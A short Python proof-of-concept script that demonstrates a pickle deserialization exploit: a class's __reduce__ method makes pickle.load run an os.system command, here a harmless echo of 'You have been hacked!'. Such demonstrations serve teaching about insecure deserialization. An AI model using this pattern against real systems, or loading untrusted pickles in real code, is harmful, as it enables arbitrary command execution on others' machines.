import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

def serialize_exploit():
    with open('evil.pickle', 'wb') as f:
        pickle.dump(EvilPickle(), f)

def deserialize_exploit():
    with open('evil.pickle', 'rb') as f:
        pickle.load(f)

serialize_exploit()
deserialize_exploit()
